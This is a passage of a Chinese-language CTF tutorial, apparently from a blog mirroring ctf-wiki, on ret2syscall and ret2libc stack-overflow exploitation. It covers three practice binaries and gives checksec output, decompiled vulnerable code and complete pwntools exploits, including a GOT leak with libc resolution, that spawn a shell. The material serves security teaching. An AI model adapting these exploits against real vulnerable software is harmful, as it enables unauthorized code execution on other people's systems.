+<pre class="line-numbers language-none"><code class="language-none">#!/usr/bin/env python
+from pwn import *
+
+sh = process('./rop')
+
+pop_eax_ret = 0x080bb196
+pop_edx_ecx_ebx_ret = 0x0806eb90
+int_0x80 = 0x08049421
+binsh = 0x80be408
+payload = flat(
+    ['A' * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])
+sh.sendline(payload)
+sh.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="题目-¶-1"><a href="#题目-¶-1" class="headerlink" title="题目 ¶"></a>题目 <span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9iYXNpYy1yb3AvI184">¶</span></h3><h2 id="ret2libc¶"><a href="#ret2libc¶" class="headerlink" title="ret2libc¶"></a>ret2libc<span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9iYXNpYy1yb3AvI3JldDJsaWJj">¶</span></h2><h3 id="原理-¶-3"><a href="#原理-¶-3" class="headerlink" title="原理 ¶"></a>原理 <span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9iYXNpYy1yb3AvI185">¶</span></h3><p>ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“/bin/sh”)，故而此时我们需要知道 system 函数的地址。</p>
+<h3 id="例子-¶-3"><a href="#例子-¶-3" class="headerlink" title="例子 ¶"></a>例子 <span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9iYXNpYy1yb3AvI18xMA==">¶</span></h3><p>我们由简单到难分别给出三个例子。</p>
+<h4 id="例-1¶"><a href="#例-1¶" class="headerlink" title="例 1¶"></a>例 1<span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9iYXNpYy1yb3AvIzE=">¶</span></h4><p>这里我们以 bamboofox 中 ret2libc1 为例</p>
+<p>点击下载: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2N0Zi13aWtpL2N0Zi1jaGFsbGVuZ2VzL3Jhdy9tYXN0ZXIvcHduL3N0YWNrb3ZlcmZsb3cvcmV0MmxpYmMvcmV0MmxpYmMxL3JldDJsaWJjMQ==">ret2libc1</span></p>
+<p>首先，我们可以检查一下程序的安全保护</p>
+<pre class="line-numbers language-none"><code class="language-none">➜  ret2libc1 checksec ret2libc1    
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>源程序为 32 位，开启了 NX 保护。下面来看一下程序源代码，确定漏洞位置</p>
+<pre class="line-numbers language-none"><code class="language-none">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  int v4; // [sp+1Ch] [bp-64h]@1
+
+  setvbuf(stdout, 0, 2, 0);
+  setvbuf(_bss_start, 0, 1, 0);
+  puts("RET2LIBC &gt;_&lt;");
+  gets((char *)&amp;v4);
+  return 0;
+}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>可以看到在执行 gets 函数的时候出现了栈溢出。此外，利用 ropgadget，我们可以查看是否有 /bin/sh 存在</p>
+<pre class="line-numbers language-none"><code class="language-none">➜  ret2libc1 ROPgadget --binary ret2libc1 --string '/bin/sh'          
+Strings information
+============================================================
+0x08048720 : /bin/sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>确实存在，再次查找一下是否有 system 函数存在。经在 ida 中查找，确实也存在。</p>
+<pre class="line-numbers language-none"><code class="language-none">.plt:08048460 ; [00000006 BYTES: COLLAPSED FUNCTION _system. PRESS CTRL-NUMPAD+ TO EXPAND]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>那么，我们直接返回该处，即执行 system 函数。相应的 payload 如下</p>
+<pre class="line-numbers language-none"><code class="language-none">#!/usr/bin/env python
+from pwn import *
+
+sh = process('./ret2libc1')
+
+binsh_addr = 0x8048720
+system_plt = 0x08048460
+payload = flat(['a' * 112, system_plt, 'b' * 4, binsh_addr])
+sh.sendline(payload)
+
+sh.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这里我们需要注意函数调用栈的结构，如果是正常调用 system 函数，我们调用的时候会有一个对应的返回地址，这里以’bbbb’ 作为虚假的地址，其后参数对应的参数内容。</p>
+<p>这个例子相对来说简单，同时提供了 system 地址与 /bin/sh 的地址，但是大多数程序并不会有这么好的情况。</p>
+<h4 id="例-2¶"><a href="#例-2¶" class="headerlink" title="例 2¶"></a>例 2<span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9iYXNpYy1yb3AvIzI=">¶</span></h4><p>这里以 bamboofox 中的 ret2libc2 为例</p>
+<p>点击下载: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2N0Zi13aWtpL2N0Zi1jaGFsbGVuZ2VzL3Jhdy9tYXN0ZXIvcHduL3N0YWNrb3ZlcmZsb3cvcmV0MmxpYmMvcmV0MmxpYmMyL3JldDJsaWJjMg==">ret2libc2</span></p>
+<p>该题目与例 1 基本一致，只不过不再出现 /bin/sh 字符串，所以此次需要我们自己来读取字符串，所以我们需要两个 gadgets，第一个控制程序读取字符串，第二个控制程序执行 system(“/bin/sh”)。由于漏洞与上述一致，这里就不在多说，具体的 exp 如下</p>
+<pre class="line-numbers language-none"><code class="language-none">##!/usr/bin/env python
+from pwn import *
+
+sh = process('./ret2libc2')
+
+gets_plt = 0x08048460
+system_plt = 0x08048490
+pop_ebx = 0x0804843d
+buf2 = 0x804a080
+payload = flat(
+    ['a' * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2])
+sh.sendline(payload)
+sh.sendline('/bin/sh')
+sh.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>需要注意的是，我这里向程序中 bss 段的 buf2 处写入 /bin/sh 字符串，并将其地址作为 system 的参数传入。这样以便于可以获得 shell。</p>
+<h4 id="例-3¶"><a href="#例-3¶" class="headerlink" title="例 3¶"></a>例 3<span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9iYXNpYy1yb3AvIzM=">¶</span></h4><p>这里以 bamboofox 中的 ret2libc3 为例</p>
+<p>点击下载: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2N0Zi13aWtpL2N0Zi1jaGFsbGVuZ2VzL3Jhdy9tYXN0ZXIvcHduL3N0YWNrb3ZlcmZsb3cvcmV0MmxpYmMvcmV0MmxpYmMzL3JldDJsaWJjMw==">ret2libc3</span></p>
+<p>在例 2 的基础上，再次将 system 函数的地址去掉。此时，我们需要同时找到 system 函数地址与 /bin/sh 字符串的地址。首先，查看安全保护</p>
+<pre class="line-numbers language-none"><code class="language-none">➜  ret2libc3 checksec ret2libc3
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>可以看出，源程序仍旧开启了堆栈不可执行保护。进而查看源码，发现程序的 bug 仍然是栈溢出</p>
+<pre class="line-numbers language-none"><code class="language-none">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  int v4; // [sp+1Ch] [bp-64h]@1
+
+  setvbuf(stdout, 0, 2, 0);
+  setvbuf(stdin, 0, 1, 0);
+  puts("No surprise anymore, system disappeard QQ.");
+  printf("Can you find it !?");
+  gets((char *)&amp;v4);
+  return 0;
+}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>那么我们如何得到 system 函数的地址呢？这里就主要利用了两个知识点</p>
+<ul>
+<li>system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。</li>
+<li>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。而 libc 在 github 上有人进行收集，如下</li>
+<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL25pa2xhc2IvbGliYy1kYXRhYmFzZQ==">https://github.com/niklasb/libc-database</span></li>
+</ul>
+<p>所以如果我们知道 libc 中某个函数的地址，那么我们就可以确定该程序利用的 libc。进而我们就可以知道 system 函数的地址。</p>
+<p>那么如何得到 libc 中的某个函数的地址呢？我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。<strong>当然，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。</strong></p>
+<p>我们自然可以根据上面的步骤先得到 libc，之后在程序中查询偏移，然后再次获取 system 地址，但这样手工操作次数太多，有点麻烦，这里给出一个 libc 的利用工具，具体细节请参考 readme</p>
+<ul>
+<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2xpZWFudS9MaWJjU2VhcmNoZXI=">https://github.com/lieanu/LibcSearcher</span></li>
+</ul>
+<p>此外，在得到 libc 之后，其实 libc 中也是有 /bin/sh 字符串的，所以我们可以一起获得 /bin/sh 字符串的地址。</p>
+<p>这里我们泄露 __libc_start_main 的地址，这是因为它是程序最初被执行的地方。基本利用思路如下</p>
+<ul>
+<li>泄露 __libc_start_main 地址</li>
+<li>获取 libc 版本</li>
+<li>获取 system 地址与 /bin/sh 的地址</li>
+<li>再次执行源程序</li>
+<li>触发栈溢出执行 system(‘/bin/sh’)</li>
+</ul>
+<p>exp 如下</p>
+<pre class="line-numbers language-none"><code class="language-none">#!/usr/bin/env python
+from pwn import *
+from LibcSearcher import LibcSearcher
+sh = process('./ret2libc3')
+
+ret2libc3 = ELF('./ret2libc3')
+
+puts_plt = ret2libc3.plt['puts']
+libc_start_main_got = ret2libc3.got['__libc_start_main']
+main = ret2libc3.symbols['main']
+
+print "leak libc_start_main_got addr and return to main again"
+payload = flat(['A' * 112, puts_plt, main, libc_start_main_got])
+sh.sendlineafter('Can you find it !?', payload)
+
+print "get the related addr"
+libc_start_main_addr = u32(sh.recv()[0:4])
+libc = LibcSearcher('__libc_start_main', libc_start_main_addr)
+libcbase = libc_start_main_addr - libc.dump('__libc_start_main')
+system_addr = libcbase + libc.dump('system')
+binsh_addr = libcbase + libc.dump('str_bin_sh')
+
+print "get shell"
+payload = flat(['A' * 104, system_addr, 0xdeadbeef, binsh_addr])
+sh.sendline(payload)
+
+sh.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="题目-¶-2"><a href="#题目-¶-2" class="headerlink" title="题目 ¶"></a>题目 <span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9iYXNpYy1yb3AvI18xMQ==">¶</span></h3><ul>
+<li>train.cs.nctu.edu.tw: ret2libc</li>
+</ul>
+
+                
+            </div>
+        </article>
+    
+</div>
+<div class="paginator">
+    
+        
+        <a class="prev" href="/page/3/">
+            <i class="iconfont icon-prev"></i>
+            上一页
+        </a>
+        
+        
+    
+</div>
+
+    </div>
+</div>
+<footer class="footer-social">
+    
+
+    
+
+    
+
+    <div class="footer-copyright">
+        <p class="time-line">
+            &copy;
+            
+            
+            2024
+            &nbsp;<i class="iconfont icon-heart"></i>&nbsp;
+            <a target="_blank" href="https://github.com/iJinxin">alazymachine</a>
+        </p>
+        <p class="theme-info">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme -
+            <a target="_blank" href="https://github.com/iJinxin/hexo-theme-sky">Sky</a>
+        </p>
+    </div>
+</footer>
+</body>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+
+<script src="/js/index.js"></script>
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>
+<script>
+    
+
+</script>
+</html>
